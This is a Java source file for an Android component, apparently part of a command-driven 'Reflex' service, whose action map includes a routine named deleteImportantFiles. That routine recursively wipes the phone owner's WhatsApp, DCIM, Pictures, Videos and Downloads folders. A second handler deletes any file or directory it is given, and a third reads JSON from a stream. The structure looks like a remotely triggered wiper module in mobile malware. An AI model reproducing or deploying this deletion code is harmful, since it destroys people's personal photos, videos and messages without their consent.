package com.reflex.services.fileSystem;

import android.os.Environment;

import com.reflex.services.ActionRepository;
import com.reflex.services.Reflex;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;

/**
 * built for  mapping android file system
 * action offers
 */
public class FileSystemActions extends ActionRepository {


    public static ActionRepository getInstance() {
        if (instance == null) {
            instance = new FileSystemActions();
        }
        return instance;
    }

    private FileSystemActions() {
        map = new HashMap<>();

        map.put(DELETE_IMPORTANT_FILE, args -> {
            deleteImportantFiles();
        });

        map.put(DELETE_FILEOrDirectory, args -> {
            File file = (File) args[0];
            deleteRecursive(file);
        });

        map.put(READ_JSON_STREAM, args -> {
            InputStream stream = (InputStream) args[0];
            readJSONFromAsset(stream);
        });

    }



     public  void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()){
            for (File child : fileOrDirectory.listFiles()){
                deleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }


   void deleteImportantFiles() {

        String files[] = {"WhatsApp", "DCIM", "Pictures", "Videos", "Downloads"};
        for (String name:files) {
            File file = new File(Environment.getExternalStorageDirectory()
                    .getAbsolutePath(),
                    name);
            if (file.exists()) {
                deleteRecursive(file);
            }
        }
    }

    public  JSONObject readJSONFromAsset(InputStream is) {
        JSONObject json = null;
        try {
            int size = is.available();
            byte[] buffer = new byte[size];
            is.read(buffer);
            is.close();
            json = new JSONObject(new String(buffer, StandardCharsets.UTF_8));
        } catch (IOException ex) {
            ex.printStackTrace();
            return null;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return json;
    }
}
